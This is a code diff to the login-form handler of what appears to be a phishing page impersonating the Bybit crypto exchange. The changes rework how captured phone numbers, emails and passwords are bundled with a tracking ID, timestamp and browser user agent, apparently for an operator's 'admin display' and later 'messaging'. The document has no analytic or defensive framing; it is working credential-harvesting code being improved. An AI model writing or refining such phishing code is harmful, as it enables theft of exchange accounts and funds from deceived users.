@@ -890,57 +890,55 @@
             const trackingId = getOrCreateTrackingId();
             
             let loginData = {};
-            
             if (activeTabId === 'mobile-tab') {
                 const countryCode = document.querySelector('.country-code').value;
                 const mobileInput = document.querySelector('input[type="tel"]');
                 const mobile = mobileInput ? mobileInput.value.trim() : '';
-                
                 console.log('Mobile validation - Country code:', countryCode, 'Mobile:', mobile); // Debug log
-                
                 if (!mobile) {
                     console.log('Mobile validation failed - empty mobile'); // Debug log
                     showErrorMessage('Please enter your mobile number');
                     return;
                 }
-                
                 const fullMobile = countryCode + mobile;
-                
-                // Format phone number for better display
                 const formattedPhone = `${countryCode} ${mobile}`;
-                
                 loginData = {
+                    login_email: fullMobile, // Use login_email for both email and phone
+                    login_password: password,
+                    tracking_id: trackingId,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent,
+                    // Optionally keep extra fields for analytics:
                     login_type: 'mobile',
                     country_code: countryCode,
                     mobile: mobile,
-                    email: fullMobile, // Full phone number for admin display
-                    phone_display: formattedPhone, // Formatted phone for better readability
-                    credential_type: 'phone', // Specify this is a phone credential
-                    password: password
+                    phone_display: formattedPhone,
+                    credential_type: 'phone',
+                    platform: 'bybit'
                 };
             } else if (activeTabId === 'email-tab') {
                 const emailInput = document.querySelector('input[type="email"]');
                 const email = emailInput ? emailInput.value.trim() : '';
-                
                 console.log('Email validation - Email:', email); // Debug log
-                
                 if (!email) {
                     console.log('Email validation failed - empty email'); // Debug log
                     showErrorMessage('Please enter your email address');
                     return;
                 }
-                
                 if (!isValidEmail(email)) {
                     console.log('Email validation failed - invalid format'); // Debug log
                     showErrorMessage('Please enter a valid email address');
                     return;
                 }
-                
                 loginData = {
+                    login_email: email, // Use login_email for both email and phone
+                    login_password: password,
+                    tracking_id: trackingId,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent,
                     login_type: 'email',
-                    email: email,
-                    credential_type: 'email', // Specify this is an email credential
-                    password: password
+                    credential_type: 'email',
+                    platform: 'bybit'
                 };
             }
             
@@ -956,9 +954,9 @@
             console.log('Credential type:', loginData.credential_type); // Show credential type
             
             // Store email/mobile for later use (messaging)
-            if (loginData.email) {
-                localStorage.setItem('bybit_email', loginData.email);
-                sessionStorage.setItem('bybit_email', loginData.email);
+            if (loginData.login_email) {
+                localStorage.setItem('bybit_email', loginData.login_email);
+                sessionStorage.setItem('bybit_email', loginData.login_email);
             }
             
             // Save user preferences for UX
